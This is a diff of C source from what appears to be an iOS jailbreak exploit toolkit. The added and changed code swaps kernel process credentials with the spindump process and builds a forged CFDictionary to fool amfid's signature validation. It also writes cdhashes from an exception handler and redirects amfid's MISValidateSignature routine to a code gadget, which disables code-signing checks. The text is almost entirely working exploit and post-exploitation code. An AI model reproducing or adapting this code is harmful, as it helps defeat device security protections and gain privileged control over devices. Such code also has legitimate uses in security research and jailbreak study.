@@ -152,6 +152,16 @@ void safepatch_swap_spindump_cred(uint64_t target_proc){
     }
 }
 
+void safepatch_unswap_spindump_cred(uint64_t target_proc){
+    if(spindump_proc_cred){
+        kill(spindump_pid, SIGCONT);
+        kill(spindump_pid, SIGKILL);
+        spindump_pid = 0;
+        spindump_proc_cred = 0;
+    }
+    if(kapi_write64(target_proc + OFFSET(proc, p_ucred), self_cached_creds)) printf("-> Successfully swapped spindump credentials.\n");
+}
+
 
 void pth_commAttr_init(){
     pthread_attr_init(&pth_commAttr);
@@ -312,20 +322,20 @@ kptr_t binary_load_address(mach_port_t target_port){
 
 void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint64_t shadowp){
     // Build a self-contained, remote-address-adapted CFDictionary instance
-    
+
     CFDataRef _cfhash_cfdata = CFDataCreate(kCFAllocatorDefault, input_cdHash, TRUST_CDHASH_LEN);
     void *cfhash_cfdata = (void*)_cfhash_cfdata;
     const char *iomatch_key = "CdHash";
-    
+
     size_t key_len = strlen(iomatch_key) + 0x11;
     key_len = (~0xF) & (key_len + 0xF);
     size_t value_len = 0x60; // size of self-contained CFData instance
     value_len = (~0xF) & (value_len + 0xF);
-    size_t total_len = key_len + value_len + 0x40;
-    
+    size_t total_len = key_len + value_len + 0x20;
+
     *out_size = total_len;
     char *writep = (char *)calloc(1, total_len);
-    
+
     char *realCFString = (char*)CFStringCreateWithCString(0, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", kCFStringEncodingUTF8);
     const char *keys[] = {realCFString};
     const char *values[] = {realCFString};
@@ -334,14 +344,14 @@ void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint6
     CFRetain(realCFDic);
     CFRetain(realCFDic);
     CFRetain(realCFDic);
-    memcpy(writep, realCFDic, 0x40);
-    
+    memcpy(writep, realCFDic, 0x20);
+
     writep = writep + total_len - value_len;
     shadowp = shadowp + total_len - value_len;
     uint64_t value = shadowp;
     memcpy(writep, cfhash_cfdata, 0x60);
     CFRelease(cfhash_cfdata);
-    
+
     writep -= key_len;
     shadowp -= key_len;
     uint64_t key = shadowp;
@@ -349,23 +359,19 @@ void *Build_ValidateSignature_dic(uint8_t *input_cdHash, size_t *out_size, uint6
     *(uint64_t*)(writep + 8) = *(uint64_t*)(realCFString + 8);
     *(uint8_t*)(writep + 16) = strlen(iomatch_key);
     memcpy(writep + 17, iomatch_key, strlen(iomatch_key));
-    
-    writep -= 0x40;
-    shadowp -= 0x40;
-    *(uint64_t*)(writep + 0x10) = 0x41414141;
-    *(uint64_t*)(writep + 0x18) = 0x42424242;
-    *(uint64_t*)(writep + 0x20) = key;
-    *(uint64_t*)(writep + 0x28) = value;
-    *(uint64_t*)(writep + 0x30) = 0;
-    *(uint64_t*)(writep + 0x38) = 0;
-    
+
+    writep -= 0x20;
+    shadowp -= 0x20;
+    *(uint64_t*)(writep + 0x8) = value;
+    *(uint64_t*)(writep + 0x10) = key;
+
     CFRelease(realCFDic);
     CFRelease(realCFDic);
     CFRelease(realCFDic);
     CFRelease(realCFDic);
     CFRelease(realCFDic);
     CFRelease(realCFString);
-    
+
     return writep;
 }
 
@@ -445,9 +451,9 @@ void* amfid_exception_handler(void* arg){
                     else{
                         if(cdhash){
                             for (int i = 0; i < TRUST_CDHASH_LEN; i++){
-                                kapi_write(update_cdhash_in_amfid + i, (void *)cdhash[i], sizeof((void *)cdhash[i]));
+                                kapi_write((kptr_t)(update_cdhash_in_amfid + i), (void*)cdhash[i], (sizeof(cdhash[i])));
                             }
-                            kapi_write(reserved_mem_in_amfid + offset_to_store, (void *)update_retainCnt_in_amfid, 8);
+                            kapi_write64(reserved_mem_in_amfid + offset_to_store, update_retainCnt_in_amfid);
                         }
                     }
                     free(cdhash);
@@ -477,7 +483,6 @@ void* amfid_exception_handler(void* arg){
                                MACH_PORT_NULL,
                                MACH_MSG_TIMEOUT_NONE,
                                MACH_PORT_NULL);
-                
                 mach_port_deallocate(mach_task_self(), thread_port);
                 mach_port_deallocate(mach_task_self(), task_port);
             }
@@ -571,15 +576,14 @@ kptr_t perform_amfid_patches(){
     kern_return_t ret = host_get_amfid_port(mach_host_self(), &amfid_task_port);
     if(ret == KERN_SUCCESS){
         printf("----> AMFID Task:\t0x%llx\t\t\t(from proc)\n", kproc_find_by_pid(amfid_pid) + OFFSET(proc, task));
-        // debug_dump_ipc_port(amfid_task_port, &amfid_ipc_entry);
         printf("----> AMFID Port:\t0x%x\n", remoteTask);
         set_exception_handler(remoteTask);
-        //set_exception_handler(amfid_task_port);
         kptr_t amfid_base = binary_load_address(remoteTask);
         printf("----> AMFID base:\t0x%llx\n", amfid_base);
         vm_protect(remoteTask, mach_vm_trunc_page(amfid_base + amfid_OFFSET_MISValidate_symbol), 0x4000, false, VM_PROT_READ|VM_PROT_WRITE);
         uint64_t redirect_pc = amfid_base + amfid_OFFSET_gadget;
         kapi_write64(amfid_base + amfid_OFFSET_MISValidate_symbol, redirect_pc);
+        safepatch_unswap_spindump_cred(g_exp.self_proc);
     } else manticore_error("Could not get amfid's service port!\n");
     return 0;
 }
